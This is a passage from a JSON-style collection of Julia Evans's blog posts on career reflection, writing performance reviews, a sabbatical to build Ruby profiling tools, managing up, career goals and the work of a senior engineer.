here, like “early-stage ideas are fragile and need to be sheltered” :) \n\n hiding in a corner with my keyboard is not for me though \n\n Right now I’m planning a biggish (big for me, anyway! I actually want people to\nuse it!) open source project I’m going to start in January and I.. don’t really\nknow if it will work? So it feels scary to announce “hey, I’m planning X, these\nare my goals”. But I will definitely announce it! :) \n\n In the past I’ve definitely worried about getting excessive stop energy /\nbikeshedding when talking about plans. I think where I work it’s better to tell\npeople what I’m working on though! And lately when we share plans with\npeople, almost all of the feedback I see is super helpful! \n\n"},
{"url": "https://jvns.ca/blog/2017/03/17/career-narrative/", "title": "Writing down my career", "content": "\n     \n\n I’ve been working at my job for 3 years now. That feels weird because my total\nprogramming career so far is 5 years, so 3 years is a big chunk of it. \n\n At the beginning of January this year, I started wondering – what have\nI really done here? Am I doing things that are worthwhile? What should I\nbe doing differently? It feels pretty worth thinking about because I\nhave spent 3 years doing it 40 hours a week every week. \n\n So I had the idea to just write down every single thing I did in my\ncareer here so far. I mentioned this to my manager one day and he\nwas like “great idea, julia!” and wrote up a helpful format for me to\nput it in. \n\n the format \n\n here are the basic sections: \n\n \n Projects \n Design work & documentation \n Collaboration & mentorship (did i do an extra good job of reviewing code? did i\nhelp someone with a project a lot?) \n Stuff that isn’t my job (sometimes I organize events and do other\nrandom tasks that aren’t part of my normal job. That goes here.) \n \n\n I spent about half a day filling this out. I split it up by year (2014,\n2015, 2016) and for each year wrote down everything I did that year. I tried\nto remember every major project I’d worked on, why we did the project,\nwhat the results were, whether it worked out the way we hoped it would\nor not. I was pretty honest because, well, it was for me and I wanted to\nunderstand what was working and what wasn’t. I ended up writing like 13\npages of details. \n\n I don’t really know that these are the exact right categories (would you\nuse different ones? what are they?) \n\n what I learned \n\n Writing down all this stuff was pretty useful! It helped me see some\npatterns, like: \n\n \n in my first year, I got a lot more guidance about what to\nwork on than I did afterwards. \n I didn’t write any design documents for the first 2 years, and then in\nyear 3 I started doing that. Starting to write design documents was\nreally great. \n I really do not write a lot of documentation at work, even though it’s\nsomething I thought I valued. \n \n\n and a bunch more interesting-to-me things. It was really useful to look\nat projects that failed / didn’t work out the way I had hoped and think\nabout whether I could learn anything. (and, conversely, look at the\nsuper successful projects and try to see what I should keep on doing!) \n\n why was it useful? \n\n Here are a few reasons I think writing all this stuff down was useful! \n\n I decided I thought documentation was important, and that I wanted to\nspend a little more time investing in documentation for my team. I am\nhappy about that, so far! \n\n It helped me better appreciate people who have helped me along the way\n(wow, $person really did help me a lot, that’s awesome, I should tell\nthem that) \n\n I got a new manager pretty shortly after, and I could show it to him and\nhe could see what kind of work I’d done previously. And then when he\nwanted to tell other people how great my work was, he had an easy\nreference to use. \n\n Sometimes I worry that I haven’t accomplished enough good things (“3\nyears? what have I even been doing?“). Writing down a ton of facts about\nthings that I’ve done at work helps assuage those worries a bit! (“hmm,\nwell, that  is  a lot of things, I guess I was doing SOMETHING =D”) \n\n reflection is good! \n\n I think taking time to write down facts about what I’ve done at work was\na really good thing to do! I really like the fact-based approach  – “we\ndid X! here is the reason we did it! here were the results!” instead of\ntrying to evaluate everything (“I did a good job”). I think I will try\nto do it again. \n\n"},
{"url": "https://jvns.ca/blog/2018/02/10/positive-constructive-feedback/", "title": "Writing performance reviews with positive constructive feedback", "content": "\n     \n\n Every 6 months at work, I need to write performance reviews for the people I work with (who are all\nexcellent). I find this really hard! Who am I to review how well someone is doing? I’ve only\nrecently started to feel a little more comfortable writing peer feedback, and what’s helped me is to\nfocus on saying things about the person’s work that are both positive and constructive. My goals in\nwriting a performance review are to write something that will be useful for the person to read, and\nmake sure that the higher-ups reading the review understand why that person’s work is important. \n\n It’s very easy to write positive feedback that isn’t useful – “X is so great!” “I love working\nwith X!” “X is one of the best developers I know!”. But positive feedback can (and should!) be\nuseful. My goal is to write really specific positive feedback explaining exactly what about that\nperson’s work is great. \n\n Positive constructive feedback obviously isn’t the only kind of feedback but I find it’s the easiest\nstarting point for me. For a broader view (which also talks about negative feedback) the  radical\ncandor blog  has some good posts. \n\n Here are 3 strategies for giving useful positive feedback! I obviously didn’t invent any of this –\nlots of people I work with give feedback in this style. \n\n talk about their strengths! \n\n It’s super useful to highlight what you see as someone’s strengths! Like if you tell someone that\nyou think code review is a huge strength of theirs, it’s a great way to encourage them to continue\ninvesting time in code review. For example: \n\n \n X gives extremely useful code review and it helps folks on the team level up \n X has a lot of expertise in   and is great at sharing that expertise which has really\nhelped us move more quickly on Y project \n X is great at proactively working on systems that aren’t currently on fire, but are  going  to be\non fire in 3-6 months if we don’t intervene. This means that as a team we spend way less time\nfirefighting. \n \n\n I like to give specific examples of how I see those strengths playing out in practice, like “X is\nreally good at helping figure out tough technical decisions, we were really struggling to figure out\nwhat approach to take on Project Y and they asked helpful questions that let us figure it out”. \n\n I also try to be careful about a couple of things – first, I think it’s important to highlight\nstrengths that are actually a key part of the person’s job. If you’re talking about a programmer and\nyour primary feedback is something like “X is really organized”, you can accidentally end up\nimplying that they don’t have other skills that are more directly important to the job. Second, I\nthink about what level the person is at and try to highlight things at the appropriate level. Like\nthe kinds of strengths I’d talk about in an intern are different from what I’d talk about for a\nsenior developer. \n\n talk about their impact! \n\n This is one of my favorite things to talk about! Why is this person’s work important to the\norganization? Did they do an especially good job on a specific project they worked on? \n\n A few different possible kinds of impact to discuss: \n\n \n X did <specific project> and executed it really well. Here’s why that project is important\nand some of the specific contributions/decisions they made along the way that I thought were\nespecially good. For example “built especially great tests early on, which helped other folks\ncontribute with confidence” or “did $HARD_THING which normally wouldn’t be part of their job but\nreally helped the project succeed” \n X helped  me  a lot, for example “I couldn’t have done project Y without X’s support, they helped\nme in these specific ways”. 1:1 mentoring is incredibly important but often not that visible to\nother people, so bringing it up in a perf review helps makes sure it’s recognized. \n X helps raise our standards as a team in some way, for instance “X knows a lot about accessibility\nand always brings it up in code review / advises other team members on best practices in a way.\nOur site would not be as accessible without X’s work.” \n \n\n Sometimes when doing this I’ll hunt through the person’s pull requests / emails they’ve sent about\ntheir work to make sure that there isn’t some Big Important Thing they did 6 months ago that I’ve\ntemporarily forgotten about. \n\n I’ve also started asking “hey, do you have a document listing your recent successes that I can look\nthrough to make sure I haven’t forgotten anything?“. Some people keep one, and it’s really helpful\nwhen they do! \n\n talk about the future! \n\n In our perf review form there’s a “what could this person be doing better?” section. This is where\nmore negative feedback often goes (“what didn’t go well last year?”). But there’s also a lot of room\nfor positive feedback here! Of  course  the work this person is doing next year is going to be\ndifferent from the work they did this year. So how could their next year be even more awesome than\nthis year?  What would that look like exactly? \n\n Here are a few possible forms of this: \n\n \n Suggest a specific (maybe ambitious!) goal/milestone that you think would be great to reach. \n Point out something they’ve been doing in a small way (for example leadership work) and suggest\nthat they do more of that next year. \n Suggest a focus area – “you’re doing a great job of A, B, and C, and I think focusing more on A\nnext year would be good” \n Pick something you  know  the person wants to do/prioritize in the next year (that you agree is\nimportant) and suggest that to them! \n \n\n In general I think the “what could be better?” section is a really great place to affirm / reinforce\ngoals that I know the person has already, as well as to suggest things to them that I think they\nmight like to work towards. \n\n negative feedback shouldn’t show up for the first time in a perf review \n\n Negative feedback is out of scope for this post but one principle I find useful is “don’t bring\nup negative things for the first time in a performance review”. If I come up with a new thought\nabout something that hasn’t been going well (especially if it’s something I haven’t thought about in\ndepth!), I think it’s better to mention to the person outside of the context of the perf review\ninstead. \n\n My view right now is that poorly-considered negative feedback is much more destructive than\npoorly-considered positive feedback, so I’m much more likely to include positive observations that\nI’m not 100% sure of than negative ones. I’ve written a bunch of performance reviews which contain\nno negative feedback, which I’m fine with. I’d much rather include no negative feedback than\nnegative feedback that’s poorly thought through and unlikely to be helpful. \n\n spending time on feedback is worth it \n\n The perf review feedback form at work says “this should take about 30 minutes”. I don’t really think\nthat’s reasonable – to really make sure I’ve remembered all of the interesting things someone has\nbeen up to in the last year I often end up looking through their pull requests, which takes quite a\nwhile. I think spending a few solid hours making sure I’ve really thought through the person’s\ncontributions, what impact they’ve been having on the team/company, and what awesome things they\ncould be doing next year is a good use of time. \n\n I really appreciate it when I get really thoughtful + insightful feedback about my work from other\npeople, and if I can do that at all for someone else I think that’s a really good thing. \n\n"},
{"url": "https://jvns.ca/blog/2017/12/02/taking-a-sabbatical-to-work-on-ruby-profiling-tools/", "title": "Taking a sabbatical to work on Ruby profiling tools", "content": "\n     \n\n Hello! I have an exciting announcement! I’ve announced this before on Twitter, but not here. \n\n From January 1 to April 1, I’ll be on sabbatical from my job and delightful team (thanks Stripe! ❤)\nand working on building better profiling tools for Ruby (and maybe Python??). I’ll be doing the Segment Open Source Fellowship (thanks Segment!)– you can read a nice description of  the fellowship and of all of the fellows’ projects . \n\n The plan is to expand the prototype in  this blog post  and  this github repo  into a real project that actually works. \n\n why does Ruby need better profiling tools? \n\n GREAT QUESTION!!! \n\n I’ve been frustrated for a long time by Ruby and Python’s available profiling tools. In C and Java,\nI can just attach to any program ( strace -p $PID ,  sudo perf record -g -p $PID , attach with\nYourKit/VisualVM) and immediately start getting information about what the program is doing. \n\n With Ruby, I need to do a bunch of steps before I start getting profiling information: \n\n \n choose a profiling library \n include the gem/module in my program \n write code (!?!) to specify which parts of the code I want to profile \n \n\n This makes me grumpy. So my plan is to work on something that’s easier to use!  This is the\ninterface for the tools I’m excited about building: \n\n \n Find your process’s PID \n run_profiler -p $PID \n Look at useful graphs \n Use the information to make your program faster!! \n \n\n The main exciting thing this means is – you don’t have to turn on profiling in advance! You don’t\nneed to use any special gems! It Just Works! \n\n That is the dream. Probably the thing I actually build will not quite reach that dream, like it will\nonly work on Linux to start and require your Ruby runtime to have debugging symbols. \n\n why I’m excited about this \n\n I think profiling tools are important, and I think  usability  of profiling tools is really\nimportant. I’ve often had a performance problem, thought “oh, let me just get a memory profile of\nthis node.js program, that will help”, and 3 hours of frustration later been unable to get the\ninformation I wanted and given up. \n\n Profiling tools are not useful if they are so confusing to use that people give up! \n\n So if we make profiling tools easier to use, people who get frustrated with their slow programs can\n fix  those programs a lot more easily! There’s so much low-hanging fruit in performance – maybe\nyou  accidentally wrote a quadratic function , maybe you\nwrote a small hacky thing and someone just needs to spend 30 minutes optimizing it, maybe you\n accidentally used java.lang.Math.pow .\nWithout a profiler, it’s basically impossible to diagnose these performance problems! \n\n debugging / programming capabilities everyone should have access to \n\n There are 3 main things I would like to be easy to get from any program: \n\n \n the current stack trace of the program (from every thread, say) \n a memory profile of the program (how many of every object is being used?) \n a sampled CPU profile / flamegraph of the program (what functions are being called the most?) \n \n\n I’m only planning to work on CPU profiling (and probably “get the current stack trace”, because\nthat’s such a simple thing). \n\n also a little nervous! \n\n I have  used  a lot of profilers/debuggers (and written who knows how many blog posts about\ndebugging tools), but I’ve never tried to  make  a profiler before. I’ve never\ntried to make an open source project that other people actually use! (strictly speaking,  https://github.com/jvns/pandas-cookbook  has thousands of github forks/stars/users, but it’s a tutorial which is a little different) \n\n I expect to run into all kinds of problems! Maybe the approach I take won’t work out! We’ll see what\nhappens. \n\n Anyway, how am I going to learn & get better if I don’t do things that are a bit scary?  I’m excited to work on this problem! \n\n open source sabbaticals are cool! \n\n I think taking a 3-month sabbatical from work to work on an open source thing full time is a really\ncool thing – I get to go back to my awesome job after, and I get to work on something I’m excited\nabout! I am happy that I work at a place that has a sabbatical program. \n\n get in touch if you have ideas \n\n If you have ideas / are interested in this field too, send me an email! I’m julia@jvns.ca.\nThroughout this project I would be totally delighted to get contributions, and I’ll post about the\nprogress I make along the way. \n\n"},
{"url": "https://jvns.ca/blog/things-your-manager-might-not-know/", "title": "Things your manager might not know", "content": "\n     \n\n When people talk about “managing up”, sometimes it’s framed as a bad thing –\nmassaging the ego of people in charge so that they treat you well. \n\n In my experience, managing up is usually a lot more practical. Your manager\ndoesn’t (and can’t!) know every single detail about what you do in your job,\nand being aware of what they might not know and giving them the information\nthey need to do their job well makes everyone’s job a lot easier. \n\n Here are the facts your manager might not know about you and your team that\nwe’ll cover in this post: \n\n \n What’s slowing the team down \n Exactly what individual people on the team are working on \n Where the technical debt is \n How to help you get better at your job \n What your goals are \n What issues they should be escalating \n What extra work you’re doing \n How compensation/promotions work at the company \n \n\n For each one, I’ll give specific ways you can help get them the information\nthey need. All of these ways you can help them will also help you – it’s not\njust an altruistic endeavor :) \n\n This post (like all my writing about working with a manager) assumes that you\ngenerally have a good relationship with your manager. \n\n your manager can’t know every detail about your job \n\n I said this already, but I want to reiterate it: the reason your manager\ndoesn’t know all these things isn’t because they’re not doing their job. It’s\nliterally impossible for them to keep track of every detail about every\nperson’s on their team’s job. It’s normal for managers to rely on their team to keep them\ninformed about important facts they need to know, especially with more senior\nengineers. \n\n Keeping them informed helps them do their job better, and it makes your job a\nlot easier too. Let’s talk about how that works! \n\n they might not know: what’s slowing the team down \n\n Sometimes, you’re working on a project and the project is going more slowly\nthan you hoped. There are always reasons for this – maybe there have been a\nlot more bugs than you expected, maybe you’re using a new technology nobody on\nthe team has ever used before, maybe you’re waiting for another team to do\nsomething. The reasons things are hard change a lot! Even if your manager knew\nwhat was slowing you down 2 weeks ago, maybe that issue has been totally\nresolved and you’re onto a totally different problem. \n\n It’s a problem if your manager doesn’t know this mostly because if they know\nwhy you’re stuck, they might be able to help. \n\n what you can do to help: tell them what’s hard about your job \n\n It can feel bad to admit that you’re having trouble with something, but tasks\nusually aren’t hard because you’re “slow” or “bad at your job”. Usually it’s\nbecause there’s something concrete that’s making it hard. Identifying what that\nthing is and telling your manager about it helps them a lot! \n\n For example, maybe you’re working on a feature and it’s turning out to be MUCH\nmore complicated than you expected because there are a lot of edge cases that\nnobody had thought about. It’s useful for your manager to know that because\nsometimes they can help address it! They might: \n\n \n Encourage you to take the time you need to figure it out (“it’s really\nimportant to get all these edge cases right, I’m happy you’re doing this!”) \n Suggest someone who could help you (“Ankita  was dealing with those exact\nissues last year, you should talk to her!”) \n Factor it into their planning (“Sounds like that won’t get done this week\nthen, good to know”) \n Deprioritize the feature (“Oh, I thought this was going to be a quick fix, if\nthis is really complicated we should focus our energy on something else\ninstead”) \n \n\n they might not know: exactly what individual people on the team are working on \n\n Your manager almost certainly knows what the team as a whole is working on\n(maybe you’re working on releasing some new site), but do they know that today\nyou’re working on getting a TLS certificate issued for the site and learning\nhow CAs work? Maybe not! \n\n The reason this is a problem for them is that someone might ask them “hey\nManager, did your team get that TLS certificate yet?”, and it looks bad for\nthem to not know the answer, or not be able to easily find out. \n\n what you can do to help: keep them informed about your progress \n\n You can ask your manager how they like to stay updated about what the team is\ndoing: maybe they want to track everything through the issue tracker, maybe\nthey want folks to write weekly digest, or maybe they have a different system. \n\n If your team uses an issue tracker, taking a few minutes to keep it up to date\ncan really help your manager keep a handle on what’s going on! If they can\nquickly look at the TLS ticket and see that you’re still working on it, that\nsaves them a lot of time and means that you can spend your 1:1s discussing more\nimportant and interesting things than “hey, are you done with that TLS\nticket?”. \n\n they might not know: where the technical debt is \n\n Your manager probably broadly understands what technology your team is using.\nBut, especially if they’ve never worked as a software engineer on your specific\nteam, they probably don’t know that much about the details! They may not\ncompletely understand the problems you’re having with your current\narchitecture, or which systems are going to fail soon. They rely on you for\nthat. \n\n And it’s important for them to know about things like technical debt: if you\nhave a system that isn’t going to meet your current scaling needs soon and is\ngoing to need a lot of work, that needs to get factored into planning! \n\n what you can do to help: tell them about technical risks! \n\n A couple of examples of things you can tell them about: \n\n \n technical debt that’s slowing you down when building new features \n systems that are causing a lot of disruption because they’re unreliable \n \n\n they might not know: how to help you get better at your job \n\n When I started out, I often felt like there were things I could be doing\ndifferently to do my job better. And that was definitely true! So I was\nsometimes confused about why my manager wasn’t giving me feedback about how I\ncould be doing things better. \n\n The reality is that in most cases, you probably know how to do your job better\nthan your manager does! You’ve spent a lot more time thinking about the\nprojects you’re working on, and they definitely can’t just parachute in and\ntell you how to improve. Of course, there are lots of times when your manager\ndoes have useful advice for you, but it’s not easy for them to figure out how\nto give it to you! Here are a few reasons why: \n\n \n They don’t necessarily even know what you’re struggling with in the first\nplace (like we talked about in the last article) \n Even if they do know, it might not be obvious to them what they can do to\nimprove the situation. Some managers are of course better at figuring this\nout than others – it’s not easy! \n \n\n what you can do to help: identify what you need and ask for it! \n\n Managers often LOVE it when you ask them for something that they can do that\nwill help you. Here are a few examples of things you could ask for: \n\n \n less work : maybe you’re doing 3 projects and it’s too much and it’s\nmaking all of 3 projects go slowly, and you need to only be working on 2\nthings. \n harder work : maybe you don’t feel like you’re learning anything with your\ncurrent work and you want to work on something that’s more of a challenge \n a learning budget : you’re learning about some new technology, and you\nthink going to a conference will really help you, and you want a couple of\ndays off and the budget to buy a ticket. \n help with an interpersonal situation : maybe you’re having a little bit of\ntrouble working with someone else on the team, and you need some advice to\nunderstand what’s going on with that person and how to work with them more\neffectively. \n specific feedback on work you did : asking for feedback on a specific\npiece of work you did (“hey, do you have any feedback on that migration we\ndid?“) is MUCH more effective than just asking “do you have any feedback for\nme?”. \n \n\n Learning how to do this well takes a lot of practice – if you want to improve\nsomething about your job, it can be hard to break that down into “ok, the\nproblem is X” and it’s even harder to identify something specific somebody else\ncould do to address the problem. But if you can do it it’s WAY easier to get\nwhat you want and good managers will be delighted to help you! \n\n It’s also  definitely  okay to bring up problems when you don’t specifically\nknow what you need – if you’re not sure how to solve the problem you can\nexplore possible solutions together! \n\n more you can do to help: tell them your goals! \n\n “Get better at your job” also means different things to different people. So if\nyou have a specific career goal, it’s important to tell it to your manager! For\nexample if you want to become an architect / team lead / manager one day, tell\nthem that! Ask them what skills they think you’ll need to build to get there!\nGood managers will be delighted to talk to you about this, figure out what you\nneed to do, and  sponsor  your work to\nhelp you get opportunities. \n\n they might not know: what issues they should be escalating \n\n Sometimes issues come up on the team that should actually be dealt with by\nsomeone higher up and that you can’t easily fix on your own. A few examples: \n\n \n You’re in a negotiation with a vendor and it’s not going well (vendor\nnegotiations happen infrequently and they can be really tricky to handle for\nanyone!) \n You’re stuck because of a conflict in priorities between teams (your team\nneeds another team to be doing X, but the other team thinks that the priority\nis Y). \n \n\n It’s bad to try to handle issues you don’t have the power to fix on your own\nbecause it’ll take forever, it’ll be frustrating for you, and you won’t be able\nto make progress. \n\n what you can do: practice escalating issues! \n\n It’s usually not totally clear which things are part of your job and which\nthings you should be escalating to your manager. The best way to get better at\nidentifying what should be escalated is to ask your manager about it when you\nnotice an issue you’re really struggling with! Eventually you’ll learn what\nkinds of issues should be escalated and which ones you should tackle on your\nown. \n\n Identifying which things you should be escalating to your manager (“hey, I\nthink you should know about this…”) isn’t easy, but it’s really a win/win\nwhen you can do it – if you escalate it to them, you’re no longer stuck trying\nto deal with an issue that’s impossible for you to fix, and they can make sure\nit gets done by people who actually have the power to do it. \n\n they might not know: what extra work you’re doing \n\n If you’re doing a bunch of extra work outside your normal job description, your\nmanager might not realize that! It’s important to bring it up with your manager\nso that they can give you credit for that work (put it in your  brag\ndocument !). \n\n Sometimes there’s also extra work you’re doing that you shouldn’t be doing\n(like in the previous section, maybe it’s something that should be escalated!),\nand in those cases telling them can help you stop doing the work. \n\n they might not know: how the company’s compensation and promotions systems work \n\n This one is a little different from the others because you’re not going\nto be giving your manager information about this in the same way, but it’s important to be aware of. \n\n I used to think that managers knew everything about compensation / promotions.\nThen one day I had a really enlightening conversation with my old manager Jay\nwhere I was asking a question about how compensation worked, and he said “yeah,\nI don’t know!”. \n\n I really appreciated how honest he was about it, and it made me realise that\nthere are a LOT of things a manager might not know about how these systems\nwork, like: \n\n \n what the system for issuing stock refreshes is \n how raises are calculated when someone gets promoted \n what’s actually expected for a promotion to a given level, and whether or not\nit’s the same as what’s written down \n whether / why exceptions are made to the rules \n the basic facts about your compensation (I’ve had jobs where managers knew my\nsalary but not what my stock grants were. Apparently this is pretty common!) \n \n\n what you can do to help: ask about how compensation works! \n\n I’ve found it really valuable to start out conversations about compensation /\npromotions in a fact-finding way – instead of saying ”hello, i want a raise”,\nit’s a lot easier for everyone to start with “hey, how does this work? can you\nexplain it to me?”. \n\n This can be especially helpful to new managers because even if they don’t know\nthe answers right away, they can often find out! So if you ask, it’s an\nopportunity for them to go figure out how these systems work. \n\n You can also get general information about how compensation and promotions work from other\nmanagers who are not your manager, if there’s a different manager you have a\ngood relationship who you’d rather have that conversation with. \n\n Some other sources of uncertainty \n\n There are also a lot of other things your manager might be uncertain about: \n\n \n They don’t know how priorities are going to change in the future – if\nthere’s a surprise change in priorities, often it’s a surprise to them too! \n They might not know if they’re going to get headcount / how to get headcount:\nif you’re stressed because your team is overloaded and you’d love to hire\nsomeone, they might need to figure out how to get permission to do that themselves \n They may not know how  they’re  performing. If they’re uncertain about how\ntheir next performance review is going to come back or if they just got a bad\nreview, sometimes that uncertainty/stress can trickle down in weird ways.\nPeople are human! I think this is good to be aware of as a possible\nexplanation for weird behaviour even if usually they won’t tell you that this\nis happening. \n \n\n If you get good at this, it’s a superpower \n\n Being good at telling your manager the right information at the right time and\nasking for what you need is a superpower. It makes you way more valuable to\nhave on a team (because your manager knows they can trust you to give them the\ninformation they need), and it’s more likely that you’ll get what you want\n(because you’re making it easy for them to do that!). \n\n This skill takes a lot of time to learn but it’s pretty easy to practice. You\ncan take a few minutes to reflect before your 1:1 with your manager and think\nabout what might be important to bring up with them. \n\n The great thing about all of this is that you don’t have to guess: if you’re\ncurious about what your manager knows about a given topic or how you can help\nget them the information they need, you can just ask them! \n\n If you want to read more about how to build a good relationship with your manager,\nI wrote a zine called  Help! I Have a Manager!  about it. \n\n \nThanks to Jay Shirley for coming up with the idea for this post with me, and to\nAkiva Leffert, Allison Kaptur, Camille Fournier, Chirag Davé, Duretti Hirpa,\nEvy Kassirer, Jay Shirley, Juan Pablo Buriticá, Kamal Marhubi, Marc Hedlund,\nMarco Rogers, and Ronnie Chen for their comments which made it a lot better.\nAll the problems with it are mine of course :)\n \n\n"},
{"url": "https://jvns.ca/blog/2018/09/30/some-possible-career-goals/", "title": "Some possible career goals", "content": "\n     \n\n I was thinking about career goals a person could have (as a software developer) this morning, and it\noccurred to me that there are a lot of possible goals! So I  asked folks on Twitter  what some possible goals were and got a lot of answers. \n\n This list intentionally has big goals and small goals, and goals in very different directions. It\ndefinitely does not attempt to tell you what sorts of goals you  should  have. I’m not sure yet\nwhether it’s helpful or not but here it is just in case :) \n\n I’ve separated them into some very rough categories. Also I feel like there’s a lot missing from this list still, and I’d be happy to hear what’s missing  on twitter . \n\n technical goals \n\n \n become an expert in a domain/technology/language (databases, machine learning, Python) \n get to a point where you can drop into new situations or technologies and quickly start making a\nbig impact \n do research-y work / something that’s never been done before \n satisfy your intellectual curiosity about something \n get comfortable with really big codebases \n work on a system that has X scale/complexity (millions of requests per second, etc) \n scale a project way past its original design goals \n do work that saves the company a large amount of money \n be an incident commander for an incident and run the postmortem \n make a contribution to an open source project \n get better at some skill (testing / debugging / a programming language / machine learning) \n become a core maintainer for an important OSS project \n build an important system from scratch \n be involved with a product/project from start to end (over several years) \n understand how complex systems fail (and how to make them not fail) \n be able to build prototypes quickly for new ideas \n \n\n job goals \n\n \n get your first job \n pass a programming interview \n get your “dream job” (if you have one) \n work at a prestigious company \n work at a very small company \n work at a company for a really long time (to see how things play out over time) \n work at lots of different companies (to get lots of different perspectives) \n get a raise \n become a manager \n get to a specific title (“architect”, “senior engineer”, “CTO”, “developer evangelist”, “principal engineer”) \n work at a nonprofit / company where you believe in the mission \n work on a product that your family / friends would recognize \n work in many different fields \n work in a specific field you care about (transit, security, government) \n get paid to work on a specific project (eg the linux kernel) \n as an academic, have stable funding to work towards your research interests \n become a baker / work on something else entirely :) \n \n\n entrepreneurship goals \n\n This category is obviously pretty big (there are lots of start-your-own-business related goals!) and\nI’m not going to try to be exhaustive. \n\n \n start freelancing \n start a consulting company \n make your first sale of software you wrote \n get VC funding / start a startup \n get to X milestone with a company you started \n \n\n product goals \n\n I think the difference between “technical goals” and “product goals” is pretty interesting – this\narea is more about the impact that your programs have on the people who use them than what those\nprograms consist of technically. \n\n \n do your work in a specific  way  that you care about (eg make websites that are accessible) \n build tools for people who you work with directly (this can be so fun!!) \n make a big difference to a system you care about (eg “internet security”) \n do work that helps solve an important problem (climate change, etc) \n work in a team/project whose product affects more than a million people \n work on a product that people love \n build developer tools \n \n\n people/leadership goals \n\n \n help new people on your team get started \n help someone get a job/opportunity that they wouldn’t have had otherwise \n mentor someone and see them get better over time \n “be a blessing to others you wished someone else was to you” \n be a union organizer / promote fairness at work \n build a more inclusive team \n build a community that matters to people (via a meetup group or otherwise) \n \n\n communication / community goals \n\n \n write a technical book \n give a talk (meetup, conference talk, keynote) \n give a talk at a really prestigious conference / in front of people you respect \n give a workshop on something you know really well \n start a conference \n write a popular blog / an article that gets upvoted a lot \n teach a class (eg at a high school / college) \n change the way folks in the industry think about something (eg blameless postmortems, fairness in\nmachine learning) \n \n\n work environment goals \n\n A lot of people talked about the flexibility to choose their own work environment / hours (eg “work\nremotely”). \n\n \n get flexible hours \n work remotely \n get your own office \n work in a place where you feel accepted/included \n work with people who share your values (this involves knowing what your values are! :) ) \n work with people who are very experienced / skilled \n have good health insurance / benefits \n make X amount of money \n \n\n other goals \n\n \n remain as curious and in love with programming as the first time I did it \n \n\n nobody can tell you what your goals are \n\n This post came out of reading  this blog post  about how\nyour company’s career ladder is probably not the same as your goals and chasing the next promotion\nmay not be the best way to achieve them. \n\n I’ve been lucky enough to have a lot of my basic goals met (“make money”, “learn a lot of things at\nwork”, “work with kind and very competent people”), and after that I’ve found it hard to figure out\nwhich of all of these milestones here will actually feel meaningful to me! Sometimes I will achieve\na new goal and find that it doesn’t feel very satisfying to have done it. And other times I will do\nsomething that I didn’t  think  was a huge deal to me, but feel really proud of it afterwards. \n\n So it feels pretty useful to me to write down these things and think “do I really want to work at\nFANCY_COMPANY? would that feel good? do I care about working at a nonprofit? do I want to learn how\nto build software products that lots of people use? do I want to work on an application that serves\na million requests per second? When I accomplished that goal in the past, did it actually feel\nmeaningful, or did I not really care?” \n\n"},
{"url": "https://jvns.ca/blog/senior-engineer/", "title": "What's a senior engineer's job?", "content": "\n     \n\n There’s this great post by John Allspaw called “ On being a senior engineer ”. I originally read it\n4ish years ago when I started my current job and it really influenced how I thought about the\ndirection I wanted to go in. \n\n Rereading it 4 years later, one thing that’s really interesting to me about that blog post is that\nit’s explaining that empathy / helping your team succeed is an important part of being a senior\nengineer. Which of course is true! \n\n But from where I stand today, most (all?) of the senior engineers I know take on a significant\namount of helping-other-people work in addition to their individual programming work. The challenge\nI see me/my coworkers struggling with today isn’t so much “what?? I have to TALK TO PEOPLE??\nUNBELIEVABLE.” and more “wait, how do I balance all of this leadership work with my individual\ncontributions / programming work in a way that’s sustainable for me? How much of what kind of work\nshould I be doing?“. So instead of talking about the  attributes  that a senior engineer has from\nAllspaw’s post (which I totally agree with), instead I want to talk here about the  work  that a\nsenior engineer does. \n\n what this post is describing \n\n “what a senior engineer does” is a huge topic and this is a small post. things to keep in mind\nwhen reading: \n\n \n this is just one possible description of what a “senior engineer” could do. There are a lot of ways\nto work and this isn’t intended to be definitive. \n I have basically only worked at one company and this is just about my experiences so my\nperspective is obviously pretty limited \n There are obviously a lot of levels of “senior engineer” out there. This is aimed somewhere around\nP3/P4 in the  Mozilla ladder  (senior\nengineer / staff engineer), maybe a bit more on the “staff” side. \n \n\n What’s part of the job \n\n These are things that I view as being mostly a senior engineer’s job and less a manager’s job.\n(though managers definitely do some of this too, especially creating new projects / relating\nprojects to business priorities) \n\n The thing that holds all this together is that almost all of this work is fundamentally\n technical : helping someone get unstuck on a tricky project is obviously a human interaction, but\nthe issues we’ll be working on together will generally be computer issues! (“maybe if we simplify\nthis design we can be done with this way sooner!“) \n\n \n Write code.  (obviously) \n Do code reviews.  (obviously) \n Write and review design docs.  As with other review tasks, I think of “review design docs”\nas “get a second set of eyes on it, which will probably help improve the design”. \n Help team members when they’re stuck.  Sometimes folks get stuck on a project, and it’s important\nto work to support them! I think of this less as “parachute from the sky and deliver your magical\nknowledge to people” and more as “work together to understand the problem they’re trying to solve\nand see if 2 brains are better than 1” :). This also means working with someone to solve the\nproblem instead of solving the problem for them. \n Hold folks to a high quality standard.  “Quality” will mean different things for different folks\n(for my team it means reliability/security/usability). Usually when someone makes a decision that\nseems off to me, it’s either because I know something that they don’t or they know something I\ndon’t! So instead of telling someone “hey you did this wrong you should do X instead”, I try to\njust give them some extra information that they didn’t have and often that sorts it out. And\npretty often it turns out that I was missing something and actually their decision was totally\nreasonable! In the past I’ve very occasionally seen senior engineers try to enforce quality\nstandards by repeating their opinions more and more loudly because they think their opinions are\nRight and I haven’t personally found that helpful. \n Create new projects.  A software engineering team isn’t a zero-sum place! The best engineers I know\ndon’t hoard the most interesting work for themselves, they create new interesting/important work\nand create space for folks to do that work. For example, someone on my team spearheaded a rewrite\nof our deployment system which was super successful and now there’s a whole team working on new\nfeatures that are way easier to build post-rewrite! \n Plan your projects’ work.  This is about writing down / communicating the roadmap for projects\nyou’re working on and making sure that folks understand the plan. \n Proactively communicate project risks.  It’s really important to recognize when something you’re\nworking on isn’t going well, communicate it to other engineers/managers, and figure out what to\ndo. \n Communicate successes! \n Do side projects that benefit the team/company . I see a lot of senior engineers occasionally\ndoing small high leverage projects (like building dev tooling / helping set policies) that end up\nhelping a LOT of people get their work done a lot better. \n Be aware of how projects relate to business priorities. \n Decide when to stop doing a project . Figuring out when to stop / not start work on something\nis surprisingly hard :) \n \n\n I put “write code” first because I find it surprisingly easy to accidentally let that take a back\nseat :) \n\n One thing I left out is “make estimates”. Making estimates is something I’m still not very good at\nand that I don’t think I see very much of (?), but I think it could be worth spending more time on\nsome day. \n\n This list feels like a lot and like if you tried to do all those things all the time it would\nconsume all available brain space. I think in general it probably makes sense to carve out a subset\nand decide “right now I’m going to focus on X Y Z, I think my brain will explode if I try to do A B\nC as well”. 